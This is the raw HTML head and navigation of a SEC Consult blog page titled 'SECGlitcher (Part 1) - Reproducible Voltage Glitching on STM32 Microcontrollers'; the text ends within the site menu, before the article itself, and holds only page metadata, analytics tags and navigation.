<!DOCTYPE html>
<html lang="en">
<head>
<script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5NKBBM4');</script>
<link rel="dns-prefetch" href="https://www.googletagmanager.com">
<link rel="preconnect" href="https://www.googletagmanager.com">

<meta charset="utf-8">
<!-- 
	Website by LIMESODA Interactive Marketing GmbH | www.limesoda.com

	This website is powered by TYPO3 - inspiring people to share!
	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
	TYPO3 is copyright 1998-2026 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
	Information and contribution at https://typo3.org/
-->


<link rel="icon" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon.ico" type="image/vnd.microsoft.icon">
<title>SECGlitcher (Part 1) - Reproducible Voltage Glitching on STM32 Microcontrollers - SEC Consult</title>
<meta name="generator" content="TYPO3 CMS">
<meta name="description" content="Voltage glitching is a technique used in hardware security testing to try to bypass or modify the normal operation of a device by injecting a glitch, or a brief but precise disruption, into its power supply voltage.">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="index,follow">
<meta property="og:title" content="SECGlitcher (Part 1) - Reproducible Voltage Glitching on STM32 Microcontrollers">
<meta property="og:type" content="article">
<meta property="og:url" content="https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/">
<meta property="og:image" content="https://sec-consult.com/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_bac653aa8a.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="617">
<meta property="og:description" content="Voltage glitching is a technique used in hardware security testing to try to bypass or modify the normal operation of a device by injecting a glitch, or a brief but precise disruption, into its power supply voltage.">
<meta property="og:site_name" content="SEC Consult">
<meta name="twitter:card" content="summary">
<meta name="google" content="notranslate">
<meta name="apple-mobile-web-app-capable" content="no">
<meta name="format-detection" content="telephone=no">


<link rel="stylesheet" href="/typo3temp/assets/compressed/merged-c936135929efb7b4b239fd49822fb85e-fc5cbfb141578f29a693845f3b222b2c.css?1784637545" media="all">



<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/manifest.js?1784637527" defer="defer"></script>
<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/vendor.js?1784637527" defer="defer"></script>

<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/main.js?1784637527" defer="defer"></script>



<link rel="apple-touch-icon" sizes="180x180" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon-16x16.png">
<link rel="manifest" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/site.webmanifest">
<link rel="mask-icon" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/safari-pinned-tab.svg" color="#ea8923">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="theme-color" content="#ffffff">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Icons/icons-v2.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-500.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-700.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-regular.woff2" type="font/woff2" crossorigin="anonymous">
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"SEC Consult Unternehmensberatung GmbH","url":"https://sec-consult.com/","email":"office@sec-consult.com","logo":"https://sec-consult.com/fileadmin/user_upload/sec-consult/SEC-Consult-Logo.png","foundingDate":"2002","foundingLocation":{"@type":"City","name":"Wiener Neustadt"},"location":[{"@type":"LocalBusiness","name":"SEC Consult Unternehmensberatung GmbH","image":"https://sec-consult.com/fileadmin/user_upload/sec-consult/SEC-Consult-Logo.png","telephone":"+43 1 890 30 43 0","address":{"@type":"PostalAddress","streetAddress":"Wagramer Straße 19 / 16. Stock","postalCode":"1220","addressRegion":"Wien","addressCountry":"Österreich"},"geo":{"@type":"GeoCoordinates","latitude":48.23487,"longitude":16.4208}}],"sameAs":["https://sec-consult.com","https://twitter.com/sec_consult","https://www.linkedin.com/company/sec-consult","https://www.xing.com/companies/secconsultunternehmensberatunggmbh"],"telephone":"+43 1 890 30 43 0"}</script>
<link rel="canonical" href="https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/"/>

<link rel="alternate" hreflang="en-us" href="https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/"/>
<link rel="alternate" hreflang="de-AT" href="https://sec-consult.com/de/blog/detail/secglitcher-teil-1-reproduzierbares-voltage-glitching-auf-stm32-mikrocontrollern/"/>
<link rel="alternate" hreflang="x-default" href="https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/"/>
<script id="ls-cookie-consent" type="application/json">{"groups":{"group-2":{"cookie-5":{"gtm-trigger":"","mtm-trigger":"","header":["<!-- Matomo Tag Manager -->\r\n<script>\r\nvar _mtm = window._mtm = window._mtm || [];\r\n_mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});\r\nvar d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];\r\ng.async=true; g.src='https:\/\/sec-consult.com\/matomo\/js\/container_EbyLTruV.js'; s.parentNode.insertBefore(g,s);\r\n<\/script>\r\n<!-- End Matomo Tag Manager -->"]}},"group-3":{"cookie-7":{"gtm-trigger":"google-ads","mtm-trigger":""}}},"options":{"forceConsent":false,"hideOptions":false,"noTracking":false},"rootPid":1}</script>
<!-- This site is optimized with the Yoast SEO for TYPO3 plugin - https://yoast.com/typo3-extensions-seo/ -->
<script type="application/ld+json">[{"@context":"https:\/\/www.schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/sec-consult.com\/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@id":"https:\/\/sec-consult.com\/blog\/","name":"Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/sec-consult.com\/blog\/detail\/","name":"Detail"}}]}]</script>
</head>
<body id="p31" class="page-31 pagelevel-2 language-en backendlayout-default layout-0" itemscope itemtype="https://schema.org/WebPage">




<div class="wrapper"><header class="page-header"><div class="page-header-container"><nav class="navbar"><div class="navbar-left"><a class="navbar__home-link" title="Home" href="/"><svg xmlns="http://www.w3.org/2000/svg" id="Ebene_1" version="1.1" viewBox="0 0 306.9 88.5" class="navbar-logo" width="230" height="67" aria-hidden="true"><defs><style>.st0{fill:#333c42}.st1{fill:#fff}</style></defs><path d="M306.8 61.6c0 2.9-2.3 5.2-5.2 5.2H5.2c-2.8 0-5.2-2.3-5.2-5.2V5.2C0 2.3 2.3 0 5.2 0h296.5c2.9 0 5.2 2.3 5.2 5.2v56.4Z" class="st1"/><path d="M305.3 61.6c0 1.8-1.8 3.7-3.7 3.7H5.1c-1.8 0-3.6-1.8-3.6-3.7V5.2c0-1.8 1.8-3.7 3.7-3.7h296.5c1.8 0 3.7 1.9 3.7 3.7v56.4Z" class="st0"/><path d="M64.8 57c0 2.9-1.1 3.9-3.9 3.9H9.4c-2.9 0-3.9-1.1-3.9-3.9V9.5c0-2.9 1.1-4 3.9-4h51.5c2.9 0 3.9 1.1 3.9 4V57Z" class="st1"/><path fill="#6f8591" d="m35.4 6.2 8.5 17.3L63 26.2 49.2 39.7l3.3 18.9-17.1-8.9-17 8.9 3.3-18.9L7.9 26.2l19-2.7 8.5-17.3z"/><path fill="#a2bfce" d="m35.4 6.2 8.5 17.3-3.6 10.2L63 26.2 49.2 39.7l-7.3 4.5 10.6 14.4-17.1-8.9-5.7-6.7-11.3 15.6 3.3-18.9 5.3-7.2-19.1-6.3 18.4-2.6 9.1 3.6v-21z"/><circle cx="35.4" cy="34.7" r="16" class="st1"/><path d="M50.3 34.7c0 8.2-6.7 14.9-14.9 14.9s-14.9-6.7-14.9-14.9 6.7-14.9 14.9-14.9 14.9 6.7 14.9 14.9Z" class="st0"/><path d="M47.8 34.7c0 6.8-5.5 12.4-12.4 12.4S23 41.6 23 34.7s5.5-12.4 12.4-12.4 12.4 5.5 12.4 12.4Z" class="st1"/><path fill="#f7941d" d="M46.7 34.7c0 6.2-5.1 11.3-11.3 11.3s-11.3-5-11.3-11.3 5.1-11.3 11.3-11.3 11.3 5 11.3 11.3Z"/><path d="M77.9 42.2c1.7.9 4.3 1.9 7 1.9s4.4-1.3 4.4-3.3-1.3-3-4.7-4.2c-4.7-1.8-7.7-4.6-7.7-9s4-9.1 10.6-9.1 5.5.7 7.1 1.5l-1.4 5.5c-1.1-.6-3.1-1.4-5.8-1.4s-4.1 1.4-4.1 2.9 1.5 2.8 5.2 4.3c4.9 2 7.2 4.8 7.2 9s-3.6 9.4-11.3 9.4-6.4-.9-7.9-1.9l1.3-5.6ZM116.8 36.4h-10.3v7.2H118v5.6h-17.8V19h17.2v5.6h-10.9v6.3h10.3v5.6ZM142.9 48.4c-1.1.6-3.8 1.3-7.1 1.3-9.7 0-14.7-6.5-14.7-15.2s6.8-16 15.3-16 5.8.7 6.9 1.3l-1.3 5.4c-1.2-.6-3-1.1-5.3-1.1-5 0-8.9 3.3-8.9 10s3.3 9.9 8.9 9.9 4-.4 5.3-1l.9 5.4ZM176 48.4c-1.1.6-3.8 1.3-7.1 1.3-9.7 0-14.7-6.5-14.7-15.2s6.8-16 15.3-16 5.8.7 6.9 1.3l-1.3 5.4c-1.2-.6-3-1.1-5.3-1.1-5 0-8.9 3.3-8.9 10s3.3 9.9 8.9 9.9 4-.4 5.3-1l.9 5.4ZM199.3 38c0 8-5.3 11.7-10.7 11.7s-10.5-4.2-10.5-11.3 4.3-11.7 10.9-11.7 10.4 4.6 10.4 11.3Zm-14.7.2c0 3.8 1.4 6.6 4.1 6.6s4-2.7 4-6.6-1.2-6.5-4-6.5-4.1 3.4-4.1 6.6ZM203.2 34.3c0-2.7 0-5-.2-7h5.5l.3 3h.1c.8-1.4 2.9-3.5 6.3-3.5s7.3 3 7.3 9.5v13h-6.3V37.1c0-2.8-.9-4.8-3.2-4.8s-2.8 1.3-3.2 2.6c-.2.5-.2 1.1-.2 1.7v12.7h-6.3V34.4ZM227.5 43.3c1.2.8 3.6 1.6 5.4 1.6s2.7-.7 2.7-1.8-.6-1.7-3-2.6c-4.2-1.5-5.9-4-5.8-6.6 0-4.1 3.2-7.2 8.3-7.2s4.5.6 5.7 1.3l-1.1 4.7c-.9-.5-2.7-1.3-4.4-1.3s-2.4.7-2.4 1.8.8 1.6 3.3 2.6c3.9 1.4 5.4 3.6 5.5 6.8 0 4.1-3 7.1-8.8 7.1s-5-.7-6.6-1.6l1.1-4.8ZM264.7 42.2c0 2.9 0 5.2.2 7h-5.5l-.3-3.1h-.1c-.8 1.3-2.7 3.6-6.4 3.6s-7.1-2.8-7.1-9.6V27.2h6.3V39c0 3.2 1 5.1 3.2 5.1s2.8-1.3 3.2-2.4c.2-.4.2-.9.2-1.5v-13h6.3v14.9ZM269.8 17.4h6.3v31.8h-6.3V17.4ZM288.3 21.4v5.9h4.5v5h-4.5v7.9c0 2.7.6 3.9 2.5 3.9s1.3 0 1.9-.2v5.2c-.8.3-2.3.6-4 .6s-3.7-.8-4.8-1.9c-1.2-1.3-1.8-3.4-1.8-6.5v-9h-2.7v-5h2.7v-4.1l6.2-1.8Z" class="st1"/><path d="M163 85.6c0-.6.2-1.1.5-1.6s.8-.8 1.4-1c.6-.2 1.3-.4 2.1-.4h1.3c.4 0 .9.2 1.2.3v-.7c0-.7-.2-1.3-.6-1.7s-1-.6-1.8-.6-1 0-1.5.3-1 .4-1.5.8l-.6-1.1c.6-.4 1.2-.7 1.8-.9s1.2-.3 1.9-.3c1.2 0 2.1.3 2.8 1 .7.7 1 1.6 1 2.8v3.9c0 .2 0 .3.1.4s.2.1.4.2v1.2h-.7c-.4 0-.6 0-.8-.3-.2-.2-.3-.4-.3-.7v-.6c-.4.5-1 .9-1.6 1.2-.7.3-1.3.4-2 .4s-1.2-.1-1.7-.4c-.5-.3-.9-.6-1.1-1-.3-.4-.4-.9-.4-1.5Zm6.1.6c.1-.2.3-.3.3-.5s.1-.3.1-.4v-1.2l-1.2-.3c-.4-.1-.8-.1-1.2-.1-.8 0-1.5.2-1.9.5-.5.3-.8.8-.8 1.3s0 .6.2.9c.2.3.4.5.7.7s.7.3 1.2.3 1 0 1.4-.3c.4-.2.8-.4 1.1-.7ZM182.1 88.3h-1.6v-5.2c0-1-.1-1.7-.5-2.2-.3-.5-.8-.7-1.4-.7s-.9.1-1.3.3-.8.5-1.1.9-.6.8-.7 1.2v5.6h-1.6v-9.3h1.4v2c.2-.4.6-.8 1-1.1.4-.3.9-.6 1.4-.8s1-.3 1.6-.3 1 0 1.4.3c.4.2.6.5.9.8s.4.8.4 1.2.1 1 .1 1.6v5.6ZM193.2 75.5h1.4l5.2 12.8h-1.7l-1.4-3.7h-5.5l-1.4 3.7h-1.7l5.2-12.8Zm3 7.8-2.3-5.9-2.3 5.9h4.5ZM206 87.9c-.1 0-.3.1-.5.2-.2 0-.5.2-.8.2-.3 0-.6.1-.9.1s-.7 0-1.1-.2-.6-.3-.8-.7c-.2-.3-.3-.7-.3-1.1v-6.3h-1.3v-1.2h1.3v-3.1h1.6v3.1h2.1v1.2h-2.1v5.8c0 .3.1.6.3.8.2.2.4.2.7.2s.6 0 .9-.2.4-.2.5-.2l.4 1.3ZM211.7 88.5c-.7 0-1.4-.1-1.9-.4s-1.1-.6-1.5-1.1c-.4-.4-.7-1-1-1.5s-.3-1.2-.3-1.8.1-1.3.3-1.9c.2-.6.6-1.1 1-1.6.4-.4.9-.8 1.5-1.1s1.2-.4 1.9-.4 1.4.1 1.9.4c.6.3 1.1.6 1.5 1.1.4.4.8 1 1 1.6.2.6.3 1.2.3 1.9s-.1 1.3-.3 1.8c-.2.6-.5 1.1-1 1.5-.4.4-.9.8-1.5 1.1-.6.3-1.2.4-1.9.4Zm-3.1-4.8c0 .6.1 1.2.4 1.8.3.5.7.9 1.1 1.2.5.3 1 .4 1.6.4s1.1-.2 1.6-.5.9-.7 1.1-1.3.4-1.1.4-1.8-.1-1.2-.4-1.8c-.3-.5-.7-.9-1.1-1.2s-1-.5-1.6-.5-1.1.2-1.6.5-.8.7-1.1 1.3c-.3.5-.4 1.1-.4 1.8ZM221.9 88.5c-.8 0-1.5-.1-2.2-.4-.7-.3-1.3-.6-1.8-1.2l.6-1.1c.5.5 1.1.9 1.6 1.1s1.1.3 1.7.3 1.2-.1 1.6-.4c.4-.2.6-.6.6-1.1s-.1-.6-.3-.8-.5-.3-.9-.4-.8-.2-1.4-.4c-.6-.2-1.2-.4-1.6-.6-.4-.2-.8-.5-1-.8s-.3-.7-.3-1.2.2-1.1.5-1.5.7-.7 1.3-.9c.5-.2 1.2-.3 1.9-.3s1.3.1 1.9.3c.6.2 1 .5 1.5.9l-.7 1.1c-.4-.4-.8-.7-1.2-.8-.4-.2-.9-.3-1.5-.3s-.6 0-1 .1-.6.2-.8.4c-.2.2-.3.5-.3.8s0 .5.2.7.4.3.7.4.7.2 1.2.4c.7.2 1.3.4 1.9.6.5.2.9.5 1.2.8s.4.8.4 1.3c0 .9-.3 1.6-1 2.1s-1.6.7-2.7.7ZM237.4 88.5c-.7 0-1.4-.2-2-.5s-1.1-.8-1.4-1.4v1.8h-1.4V75.3h1.6V81c.4-.6.9-1.1 1.5-1.5s1.2-.6 2-.6 1.2.1 1.8.4c.5.3 1 .6 1.3 1.1.4.5.6 1 .9 1.6.2.6.3 1.2.3 1.8s-.1 1.3-.3 1.8-.5 1.1-1 1.5c-.4.4-.9.8-1.4 1s-1.1.4-1.8.4Zm-.4-1.4c.5 0 .9 0 1.3-.3s.7-.4 1-.8.5-.7.7-1.1c.2-.4.2-.8.2-1.3s-.1-1.2-.4-1.7c-.3-.5-.6-1-1.1-1.3s-1-.5-1.6-.5-.9 0-1.2.3c-.4.2-.7.5-1 .8-.3.3-.5.7-.7 1.1V85c0 .3.2.6.4.8s.4.5.7.7c.3.2.6.3.9.4.3.1.6.2.9.2ZM243.9 84.6V79h1.6v5.3c0 .9.2 1.7.5 2.2s.8.7 1.5.7.9 0 1.2-.3c.4-.2.8-.4 1.1-.8.3-.3.6-.8.8-1.2v-5.8h1.6v7.6c0 .2 0 .3.1.4s.2.1.4.2v1.2h-.7c-.3 0-.6 0-.8-.3-.2-.2-.3-.4-.3-.7v-1.1c-.5.7-1 1.2-1.7 1.6s-1.4.6-2.3.6-1.7-.3-2.2-1-.8-1.6-.8-2.9ZM258.3 88.5c-.8 0-1.5-.1-2.2-.4-.7-.3-1.3-.6-1.8-1.2l.6-1.1c.5.5 1.1.9 1.6 1.1s1.1.3 1.7.3 1.2-.1 1.6-.4c.4-.2.6-.6.6-1.1s-.1-.6-.3-.8-.5-.3-.9-.4-.8-.2-1.4-.4c-.6-.2-1.2-.4-1.6-.6-.4-.2-.8-.5-1-.8s-.3-.7-.3-1.2.2-1.1.5-1.5.7-.7 1.3-.9c.5-.2 1.2-.3 1.9-.3s1.3.1 1.9.3c.6.2 1 .5 1.5.9l-.7 1.1c-.4-.4-.8-.7-1.2-.8-.4-.2-.9-.3-1.5-.3s-.6 0-1 .1-.6.2-.8.4c-.2.2-.3.5-.3.8s0 .5.2.7.4.3.7.4.7.2 1.2.4c.7.2 1.3.4 1.9.6.5.2.9.5 1.2.8s.4.8.4 1.3c0 .9-.3 1.6-1 2.1s-1.6.7-2.7.7ZM264.2 77.1v-2h1.6v2h-1.6Zm0 11.2v-9.4h1.6v9.4h-1.6ZM276.7 88.3h-1.6v-5.2c0-1-.1-1.7-.5-2.2s-.8-.7-1.4-.7-.9.1-1.3.3c-.4.2-.8.5-1.1.9-.3.4-.6.8-.7 1.2v5.6h-1.6v-9.3h1.4v2c.2-.4.6-.8 1-1.1.4-.3.9-.6 1.4-.8s1-.3 1.6-.3 1 0 1.4.3c.4.2.6.5.9.8s.4.8.5 1.2.1 1 .1 1.6v5.6ZM283.6 88.5c-.7 0-1.4-.1-1.9-.4s-1.1-.6-1.5-1.1c-.4-.4-.8-1-1-1.5s-.4-1.2-.4-1.9.2-1.7.6-2.4 1-1.3 1.7-1.8 1.6-.7 2.5-.7 1.8.2 2.5.7 1.2 1 1.6 1.8.6 1.5.6 2.3v.6h-7.8c0 .6.2 1.1.5 1.6s.7.8 1.1 1.1c.5.3 1 .4 1.5.4s1.1-.1 1.6-.4.9-.7 1-1.1l1.4.4c-.2.5-.5.9-.9 1.2s-.9.6-1.4.8-1.1.3-1.8.3Zm-3.1-5.4h6.4c0-.6-.2-1.1-.5-1.6s-.7-.8-1.1-1.1-1-.4-1.5-.4-1.1.1-1.5.4-.9.6-1.1 1.1-.5 1-.5 1.6ZM293.6 88.5c-.8 0-1.5-.1-2.2-.4-.7-.3-1.3-.6-1.8-1.2l.6-1.1c.5.5 1.1.9 1.6 1.1s1.1.3 1.7.3 1.2-.1 1.6-.4c.4-.2.6-.6.6-1.1s-.1-.6-.3-.8-.5-.3-.9-.4-.8-.2-1.4-.4c-.6-.2-1.2-.4-1.6-.6-.4-.2-.8-.5-1-.8s-.3-.7-.3-1.2.2-1.1.5-1.5.7-.7 1.3-.9c.5-.2 1.2-.3 1.9-.3s1.3.1 1.9.3c.6.2 1 .5 1.5.9l-.7 1.1c-.4-.4-.8-.7-1.2-.8-.4-.2-.9-.3-1.5-.3s-.6 0-1 .1-.6.2-.8.4c-.2.2-.3.5-.3.8s0 .5.2.7.4.3.7.4.7.2 1.2.4c.7.2 1.3.4 1.9.6.5.2.9.5 1.2.8s.4.8.4 1.3c0 .9-.3 1.6-1 2.1s-1.6.7-2.7.7ZM302.7 88.5c-.8 0-1.5-.1-2.2-.4-.7-.3-1.3-.6-1.8-1.2l.6-1.1c.5.5 1.1.9 1.6 1.1s1.1.3 1.7.3 1.2-.1 1.6-.4c.4-.2.6-.6.6-1.1s-.1-.6-.3-.8-.5-.3-.9-.4-.8-.2-1.4-.4c-.6-.2-1.2-.4-1.6-.6-.4-.2-.8-.5-1-.8s-.3-.7-.3-1.2.2-1.1.5-1.5.7-.7 1.3-.9c.5-.2 1.2-.3 1.9-.3s1.3.1 1.9.3c.6.2 1 .5 1.5.9l-.7 1.1c-.4-.4-.8-.7-1.2-.8-.4-.2-.9-.3-1.5-.3s-.6 0-1 .1-.6.2-.8.4c-.2.2-.3.5-.3.8s0 .5.2.7.4.3.7.4.7.2 1.2.4c.7.2 1.3.4 1.9.6.5.2.9.5 1.2.8s.4.8.4 1.3c0 .9-.3 1.6-1 2.1s-1.6.7-2.7.7Z" class="st0"/></svg></a></div><div class="navbar-right"><div class="navbar-toggle"><span class="sr-only" id="toggle-btn"
                            >Toggle Navbar</span
                        ><button
                            class="navbar-toggle"
                            data-toggle="#mainNav"
                            data-toggle-global
                            aria-labelledby="toggle-btn"
                        ><span class="navbar-toggle--top"></span><span class="navbar-toggle--middle"></span><span class="navbar-toggle--bottom"></span></button></div><div class="navbar-nav" id="mainNav" data-toggle-animate><div class="nav-top"><div class="nav-top__item"><ul class="meta-nav"><li class="meta-nav__item"><a class="meta-nav__link" href="/career/">Career</a></li><li class="meta-nav__item"><a class="meta-nav__link" href="/about-us/">About us</a></li><li class="meta-nav__item"><a class="meta-nav__link" href="/contact/">Contact</a></li></ul></div><div class="nav-top__item"><ul id="language-nav" class="language-nav language-nav--0"><li class="language-nav__item language-nav__item--dropdown" data-toggle-hover><a class="language-nav__link language-nav__link--dropdown language-nav__link--active" href="#" data-toggle-media data-toggle="#languageNav" aria-expanded="false" data-toggle-group="navbar">
                            EN
                        </a><div class="language-nav__dropdown" id="languageNav" data-toggle-animate><ul class="language-nav language-nav--1"><li class="language-nav__item"><a class="language-nav__link" href="/de/blog/detail/secglitcher-teil-1-reproduzierbares-voltage-glitching-auf-stm32-mikrocontrollern/" hreflang="de-AT" title="German">
                                                        DE
                                                    </a></li></ul></div></li></ul></div><div class="nav-top__item"><div class="nav-search"><button class="nav-search__toggle"
        data-toggle-media
        data-toggle-global
        data-toggle="#searchContainer"
        type="button"
        aria-label="Toggle Search"><span class="i-search"></span><span class="i-close"></span></button><div id="searchContainer" class="nav-search__container" data-toggle-animate><form
            action="/search/"
            class="nav-search__form"
            id="searchForm"
            method="get"
        ><label class="label nav-search__label" id="input-label" for="input-id" aria-label="Search"><span class="sr-only">Search</span><input type="text"
                    id="input-id"
                    class="input__field nav-search__input"
                    name="tx_indexedsearch_pi2[search][sword]"
                    placeholder="Enter search term"><input type="hidden" name="tx_indexedsearch_pi2[action]" value="search" /><input type="hidden" name="tx_indexedsearch_pi2[controller]" value="Search" /></label><button type="submit" class="nav-search__submit" aria-label="Search"><span class="i-search"></span></button></form></div></div></div></div><div class="nav-bottom"><ul class="main-nav main-nav--0" role="menu"><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown129' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Compliance &amp; Regulations
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown129" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown129" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/compliance-regulations/nis2/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        NIS2
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/compliance-regulations/dora/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Digital Operational Resilience Act (DORA)
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/compliance-regulations/cyber-resilience-act/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Cyber Resilience Act
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown9' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Security Testing
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown9" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown9" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/web-application-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Web Application Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/penetration-testing/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Penetration Testing
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/mobile-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Mobile Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/cloud-pentesting/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Cloud Pentesting – Security in Cloud Infratructures
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/it-infrastructure-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        IT Infrastructure Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/security-for-sap-services/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Security for SAP Services
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/iot-and-embedded-systems-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        IoT and Embedded Systems Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/red-teaming/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Red Teaming
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown20' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Processes &amp; Organisation
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown20" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown20" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/information-security-management-ism/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Information Security Management (ISM)
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/ot-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        OT Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/secure-software-development/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Secure Software Development Consulting
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/red-teaming/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Red Teaming
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/sec-trainings/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        SEC Trainings
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/project-und-program-management/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Project- and Program Management
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown26' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Incident Response
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown26" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown26" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/incident-response/sec-defence/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        SEC Defence
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0" role="none" ><a href="/vulnerability-lab/"
                            class="main-nav__link main-nav__link--0"
                            role="menuitem" 
                            >
                            Vulnerability Lab
                        </a></li><li class="main-nav__item main-nav__item--0" role="none" ><a href="/blog/"
                            class="main-nav__link main-nav__link--0"
                            role="menuitem" 
                            >
                            Blog
                        </a></li></ul></div></div></div><a class="navbar-incident" href="/incident-response/sec-defence/"><div class="navbar-incident__left"><span class="i-incident"></span><br /><span
                                        >Incident?</span></div><div class="navbar-incident__right">
                                    
                                        Breached?<br />Report an incident
